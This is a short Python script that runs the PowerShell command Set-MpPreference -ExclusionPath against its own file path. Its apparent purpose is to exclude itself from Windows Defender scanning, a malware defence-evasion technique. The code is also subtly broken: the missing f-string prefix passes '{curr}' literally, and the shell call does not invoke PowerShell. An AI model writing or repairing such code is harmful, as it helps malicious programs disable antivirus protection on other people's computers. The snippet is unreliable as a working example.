import subprocess
from sys import argv

curr = argv[0]
subprocess.run("Set-MpPreference -ExclusionPath {curr}", shell=True)
